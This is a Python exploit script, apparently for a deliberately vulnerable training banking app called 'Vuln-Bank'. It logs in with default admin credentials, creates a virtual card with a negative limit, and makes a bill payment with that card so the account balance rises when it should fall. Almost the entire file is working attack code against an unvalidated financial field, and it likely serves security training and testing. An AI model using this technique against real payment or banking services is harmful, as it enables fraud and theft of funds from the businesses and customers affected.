#!/usr/bin/env python3
"""
Negative Card Limit Exploit for Vuln-Bank

This script demonstrates a critical vulnerability in the virtual card creation functionality of Vuln-Bank
where the application doesn't validate if the card limit is negative, allowing an attacker to create
virtual cards with negative limits that can be used to increase their balance instead of decreasing it.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"{Fore.BLUE}[*] Logging in as {username}...{Style.RESET_ALL}")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}[+] Login successful! Got valid JWT token.{Style.RESET_ALL}")
                return (token, data)
            else:
                print(f"{Fore.RED}[-] Login successful but no token received.{Style.RESET_ALL}")
                return (None, None)
        else:
            print(f"{Fore.RED}[-] Login failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (None, None)
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {str(e)}{Style.RESET_ALL}")
        return (None, None)

def get_balance(base_url, token):
    """
    Get the current balance of the user
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        float: Current balance if successful, None otherwise
    """
    print(f"{Fore.BLUE}[*] Getting current balance...{Style.RESET_ALL}")
    
    profile_url = f"{base_url}/profile"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(profile_url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            balance = data.get('balance')
            if balance is not None:
                print(f"{Fore.GREEN}[+] Current balance: {balance}{Style.RESET_ALL}")
                return float(balance)
            else:
                print(f"{Fore.RED}[-] Balance not found in response.{Style.RESET_ALL}")
                return None
        else:
            print(f"{Fore.RED}[-] Failed to get balance. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting balance: {str(e)}{Style.RESET_ALL}")
        return None

def create_virtual_card_with_negative_limit(base_url, token, card_limit):
    """
    Create a virtual card with a negative limit
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        card_limit: Negative card limit to set
        
    Returns:
        dict: Card details if successful, None otherwise
    """
    print(f"{Fore.BLUE}[*] Creating virtual card with negative limit of {card_limit}...{Style.RESET_ALL}")
    
    card_url = f"{base_url}/virtual_card"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    payload = {
        "card_limit": card_limit,  # Negative limit
        "card_type": "standard"
    }
    
    try:
        response = requests.post(card_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            print(f"{Fore.GREEN}[+] Virtual card created successfully!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Card details: {json.dumps(data.get('card_details', {}), indent=2)}{Style.RESET_ALL}")
            return data.get('card_details')
        else:
            print(f"{Fore.RED}[-] Failed to create virtual card. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[-] Error creating virtual card: {str(e)}{Style.RESET_ALL}")
        return None

def make_payment_with_negative_limit_card(base_url, token, card_id, amount):
    """
    Make a payment using a virtual card with a negative limit
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        card_id: ID of the virtual card to use
        amount: Amount to pay (positive)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"{Fore.BLUE}[*] Making payment of {amount} using card {card_id}...{Style.RESET_ALL}")
    
    payment_url = f"{base_url}/bill_payment"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    payload = {
        "biller_id": 1,  # Using a default biller ID
        "amount": amount,  # Positive amount
        "payment_method": "virtual_card",
        "card_id": card_id,
        "description": "Exploiting negative card limit vulnerability"
    }
    
    try:
        response = requests.post(payment_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            print(f"{Fore.GREEN}[+] Payment successful!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {json.dumps(data, indent=2)}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Payment failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error making payment: {str(e)}{Style.RESET_ALL}")
        return False

def get_virtual_cards(base_url, token):
    """
    Get the list of virtual cards for the user
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        list: List of virtual cards if successful, empty list otherwise
    """
    print(f"{Fore.BLUE}[*] Getting list of virtual cards...{Style.RESET_ALL}")
    
    cards_url = f"{base_url}/virtual_cards"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(cards_url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            cards = data.get('cards', [])
            if cards:
                print(f"{Fore.GREEN}[+] Successfully retrieved {len(cards)} virtual cards.{Style.RESET_ALL}")
                return cards
            else:
                print(f"{Fore.YELLOW}[!] No virtual cards found.{Style.RESET_ALL}")
                return []
        else:
            print(f"{Fore.RED}[-] Failed to get virtual cards. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting virtual cards: {str(e)}{Style.RESET_ALL}")
        return []

def main():
    parser = argparse.ArgumentParser(description='Negative Card Limit Exploit for Vuln-Bank')
    parser.add_argument('target_url', nargs='?', default='http://localhost:5000', help='Target URL of the Vuln-Bank application')
    parser.add_argument('--username', default='admin', help='Username to use for login')
    parser.add_argument('--password', default='admin123', help='Password to use for login')
    parser.add_argument('--card-limit', type=float, default=-10000.0, help='Negative card limit to set (default: -10000.0)')
    parser.add_argument('--payment-amount', type=float, default=1000.0, help='Amount to pay using the negative limit card (default: 1000.0)')
    args = parser.parse_args()
    
    base_url = args.target_url.rstrip('/')
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Negative Card Limit Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {base_url}{Style.RESET_ALL}")
    
    # Login to get a token
    token, user_data = login(base_url, args.username, args.password)
    
    if not token:
        print(f"{Fore.RED}[-] Failed to get token. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Get initial balance
    initial_balance = get_balance(base_url, token)
    
    if initial_balance is None:
        print(f"{Fore.RED}[-] Failed to get initial balance. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Create a virtual card with a negative limit
    card_details = create_virtual_card_with_negative_limit(base_url, token, args.card_limit)
    
    if not card_details:
        print(f"{Fore.RED}[-] Failed to create virtual card. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Get the list of virtual cards to find the ID of the newly created card
    cards = get_virtual_cards(base_url, token)
    
    if not cards:
        print(f"{Fore.RED}[-] Failed to get virtual cards. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Find the card with the negative limit
    negative_limit_card = None
    for card in cards:
        if float(card.get('card_limit', 0)) < 0:
            negative_limit_card = card
            break
    
    if not negative_limit_card:
        print(f"{Fore.RED}[-] Could not find the negative limit card. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}[+] Found negative limit card with ID: {negative_limit_card.get('id')}{Style.RESET_ALL}")
    
    # Make a payment using the negative limit card
    success = make_payment_with_negative_limit_card(base_url, token, negative_limit_card.get('id'), args.payment_amount)
    
    if success:
        # Get new balance
        time.sleep(1)  # Wait a bit for the transaction to process
        new_balance = get_balance(base_url, token)
        
        if new_balance is not None:
            balance_increase = new_balance - initial_balance
            print(f"{Fore.GREEN}[+] Balance change: {balance_increase}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Initial balance: {initial_balance}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] New balance: {new_balance}{Style.RESET_ALL}")
            
            if balance_increase > 0:
                print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully exploited negative card limit vulnerability.{Style.RESET_ALL}")
                print(f"{Fore.RED}[-] Balance increased by {balance_increase} instead of decreasing!{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Balance did not increase as expected. Vulnerability may not be exploitable.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to get new balance.{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    if success and new_balance is not None and new_balance > initial_balance:
        print(f"{Fore.RED}[-] Application is vulnerable to Negative Card Limit Attack{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] This is a critical vulnerability that allows attackers to increase their balance{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Balance increased by {new_balance - initial_balance}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] Application is not vulnerable to Negative Card Limit Attack{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] Negative Card Limit testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
